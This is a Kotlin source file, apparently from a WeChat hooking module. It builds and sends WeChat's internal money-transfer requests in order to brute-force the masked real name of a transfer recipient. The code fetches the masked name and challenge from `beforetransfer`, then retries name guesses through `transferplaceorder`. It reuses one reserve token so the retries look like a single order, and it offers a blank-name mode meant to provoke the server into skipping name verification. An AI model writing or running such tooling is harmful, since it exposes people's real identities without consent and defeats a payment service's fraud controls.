package com.AARCNoa.zhiyou.features.api.net

import dev.ujhhgtg.reflekt.reflekt
import dev.ujhhgtg.reflekt.utils.createInstance
import com.AARCNoa.zhiyou.dexkit.abc.IResolveDex
import com.AARCNoa.zhiyou.dexkit.dsl.dexClass
import com.AARCNoa.zhiyou.features.api.net.WeTransferApi.classNetSceneTenpayRemittanceGen
import com.AARCNoa.zhiyou.features.api.net.WeTransferApi.onEnable
import com.AARCNoa.zhiyou.features.api.net.WeTransferApi.pendingPlaceOrders
import com.AARCNoa.zhiyou.features.api.net.models.protobuf.BeforeTransferReqProto
import com.AARCNoa.zhiyou.features.api.net.models.protobuf.BeforeTransferRespProto
import com.AARCNoa.zhiyou.features.core.ApiFeature
import com.AARCNoa.zhiyou.features.core.Feature
import com.AARCNoa.zhiyou.utils.WeLogger
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import kotlin.coroutines.resume

/**
 * How long a `transferplaceorder` round-trip may take before we call it a timeout.
 *
 * 1.5s was too tight: a slow socket or a risk-control delay turned a perfectly good order into
 * "下单探测请求超时", which looked identical to a rejected request in the logs.
 */
private const val PLACE_ORDER_TIMEOUT_MS = 6000L

@Feature(name = "转账服务", categories = ["API"], description = "提供转账相关发包能力")
object WeTransferApi : ApiFeature(), IResolveDex {

    private const val TAG = "WeTransferApi"

    /** com.tencent.mm.plugin.remittance.model.q0 — NetSceneTenpayRemittanceGen (transferplaceorder). */
    val classNetSceneTenpayRemittanceGen by dexClass {
        searchPackages("com.tencent.mm.plugin.remittance.model")
        matcher {
            usingEqStrings("Micromsg.NetSceneTenpayRemittanceGen")
        }
    }

    /**
     * Outcome of one `transferplaceorder` round-trip.
     *
     * [json] is the parsed CGI body. When it is null, either nothing arrived within
     * [PLACE_ORDER_TIMEOUT_MS] ([timedOut] = true) or WeChat delivered a network-level error,
     * described by [errType]/[errCode]/[errMsg]. Keeping the two apart matters — both used to be
     * reported as "超时", which sent the previous round of debugging in the wrong direction.
     */
    data class PlaceOrderResult(
        val json: JSONObject?,
        val timedOut: Boolean = false,
        val errType: Int = 0,
        val errCode: Int = 0,
        val errMsg: String? = null
    ) {
        val failureReason: String
            get() = if (timedOut) {
                "下单请求超时（${PLACE_ORDER_TIMEOUT_MS}ms 内无回包）"
            } else {
                "下单失败: errType=$errType errCode=$errCode errMsg=${errMsg ?: "null"}"
            }
    }

    /**
     * Maps an in-flight [classNetSceneTenpayRemittanceGen] instance we created to the deferred
     * that awaits its parsed CGI response. Keyed by identity (the native scene doesn't override
     * equals/hashCode). The single [onEnable] hook on `onGYNetEnd` fans responses back here so
     * WeChat's own transfer flows never resolve our deferreds.
     */
    val pendingPlaceOrders = ConcurrentHashMap<Any, CompletableDeferred<PlaceOrderResult>>()

    override fun onEnable() {
        // `onGYNetEnd` has several overloads (and their argument order has changed between
        // versions), so hook every one of them and take whichever carries a JSONObject. Hooking
        // a single `firstMethod` silently swallowed the response whenever the picked overload
        // was the one without a JSON body.
        val all = runCatching {
            classNetSceneTenpayRemittanceGen.clazz.reflekt().methods { name = "onGYNetEnd" }
        }.getOrNull().orEmpty()

        val targets = if (all.isNotEmpty()) {
            all
        } else {
            runCatching {
                listOf(classNetSceneTenpayRemittanceGen.reflekt().firstMethod { name = "onGYNetEnd" })
            }.getOrElse {
                WeLogger.e(TAG, "failed to locate onGYNetEnd, placeorder will never resolve", it)
                emptyList()
            }
        }

        targets.forEach { method ->
            method.hookAfter {
                val deferred = pendingPlaceOrders[thisObject] ?: return@hookAfter
                val errType = args.getOrNull(0) as? Int ?: 0
                val errCode = args.getOrNull(1) as? Int ?: 0
                val errMsg = args.getOrNull(2) as? String
                val resp = args.firstOrNull { it is JSONObject } as? JSONObject

                // No body and no error → this was one of the other overloads; let the
                // real one complete the deferred.
                if (resp == null && errType == 0) return@hookAfter

                pendingPlaceOrders.remove(thisObject)?.complete(
                    PlaceOrderResult(
                        json = resp,
                        errType = errType,
                        errCode = errCode,
                        errMsg = errMsg
                    )
                )
                WeLogger.d(
                    TAG,
                    "onGYNetEnd: errType=$errType errCode=$errCode errMsg=$errMsg hasResp=${resp != null}"
                )
            }
        }
    }

    override fun onDisable() {
        pendingPlaceOrders.values.forEach { it.complete(PlaceOrderResult(null, errMsg = "service disabled")) }
        pendingPlaceOrders.clear()
    }

    /**
     * Holds the fixed per-session parameters that every transferplaceorder in a brute-force run
     * reuses: the target's masked real name, the `truename_extend` key from beforetransfer, and
     * a single `placeorder_reserves` token generated once so WeChat treats the retries as
     * continuations of the same order rather than fresh large transfers.
     */
    data class TransferContext(
        val memberId: String,
        val groupId: String?,
        val maskedRealName: String,
        val truenameExtend: String,
        val nickname: String,
        val amountYuan: Double,
        val placeorderReserves: String
    )

    /**
     * Step 1: `/cgi-bin/mmpay-bin/beforetransfer` → masked real name + truename_extend key.
     *
     * [dump] 会把整个响应按字段号解出来打日志。我们只用到第 4、5 两个字段，但姓名校验的
     * 挑战信息有可能挂在别的字段上，排查时用得到。
     */
    suspend fun fetchBeforeTransfer(
        memberId: String,
        groupId: String?,
        dump: Boolean = false
    ): BeforeTransferRespProto? =
        suspendCancellableCoroutine { cont ->
            val reqBytes = BeforeTransferReqProto(userName = memberId, groupId = groupId).encode()
            WePacketHelper.sendCgiRaw("/cgi-bin/mmpay-bin/beforetransfer", 2783, 0, 0, reqBytes) {
                onSuccess { bytes ->
                    if (dump && bytes != null) {
                        // 只记字段号，不解出值：转账报文里有金额与备注，属敏感信息。
                        val fields = runCatching {
                            WeProtoData.fromBytes(bytes).toJsonObject().keys()
                                .asSequence().joinToString(",")
                        }.getOrNull()
                        WeLogger.i(
                            TAG,
                            "beforetransfer proto: ${bytes.size} bytes, fields=${fields ?: "unparsed"}"
                        )
                    }
                    val proto = bytes?.let { runCatching { BeforeTransferRespProto.decode(it) }.getOrNull() }
                    if (cont.isActive) cont.resume(proto)
                }
                onFailure { errType, errCode, errMsg ->
                    WeLogger.w(TAG, "beforetransfer failed: errType=$errType errCode=$errCode errMsg=$errMsg")
                    if (cont.isActive) cont.resume(null)
                }
            }
        }

    /**
     * 姓名相关字段（`maskTruename` / `receiverTruename`）的填充方式。
     *
     * [MASKED]：把 beforetransfer 拿到的掩码填进去（原实现）。
     * [BLANK]：留空。真实客户端在「尚未核对姓名」时不会预填这两个字段，预填有可能让服务端
     * 认为姓名已知，从而跳过姓名校验、直接建单。
     */
    enum class NameFieldMode { MASKED, BLANK }

    /**
     * Step 2: build and dispatch a `transferplaceorder` ([classNetSceneTenpayRemittanceGen]) and
     * await its parsed JSON response via the [pendingPlaceOrders] routing hook.
     *
     * [inputName]/[checknameSign] are null on the probe call (to obtain the checkname challenge)
     * and set on each brute-force attempt. Placing an order does not move money — the actual
     * transfer requires a separate password-confirmed step that we never reach.
     */
    suspend fun sendPlaceOrder(
        ctx: TransferContext,
        inputName: String?,
        checknameSign: String?,
        nameFieldMode: NameFieldMode = NameFieldMode.MASKED
    ): PlaceOrderResult {
        val deferred = CompletableDeferred<PlaceOrderResult>()
        val nameField = if (nameFieldMode == NameFieldMode.BLANK) "" else ctx.maskedRealName
        val scene = try {
            // 30-arg constructor (positions matched against a real transferplaceorder call):
            //  1 fee          2 feeType="1"   3 receiverName   4 maskTruename
            //  5 payScene=31  6 transferScene=2   7 desc=""     8 i19=0
            //  9 s5=null     10 s6=null    11 dynamicCodeUrl="" 12 mchName=null
            // 13 s9=null     14 channel=14 15 receiverOpenid="" 16 s11=""
            // 17 s12=null    18 nickname   19 receiverTruename  20 f2fEvent=null
            // 21 inputName   22 checknameSign  23 truenameExtend  24 placeorderReserves
            // 25 unpayType=0 26 cancelOuttradeno=""  27 cancelReason=0  28 groupUsername
            // 29 placeorderAttach=""  30 hasTryHkpay=false
            classNetSceneTenpayRemittanceGen.clazz.createInstance(
                ctx.amountYuan, "1", ctx.memberId, nameField, 31, 2, "", 0, null, null,
                "", null, null, 14, "", "", null, ctx.nickname, nameField, null,
                inputName, checknameSign, ctx.truenameExtend, ctx.placeorderReserves,
                0, "", 0, ctx.groupId ?: "", "", false
            )
        } catch (e: Throwable) {
            WeLogger.e(TAG, "failed to construct transferplaceorder scene", e)
            return PlaceOrderResult(null, errMsg = "构造 NetScene 失败: ${e.message}")
        }

        pendingPlaceOrders[scene] = deferred
        try {
            WeNetSceneApi.sendNetScene(scene)
        } catch (e: Throwable) {
            WeLogger.e(TAG, "failed to enqueue transferplaceorder scene", e)
            pendingPlaceOrders.remove(scene)
            return PlaceOrderResult(null, errMsg = "入队失败: ${e.message}")
        }

        val result = withTimeoutOrNull(PLACE_ORDER_TIMEOUT_MS) { deferred.await() }
            ?: PlaceOrderResult(null, timedOut = true)

        pendingPlaceOrders.remove(scene)
        if (result.json == null) {
            WeLogger.w(TAG, "placeorder [$inputName] -> ${result.failureReason}")
        }
        return result
    }
}
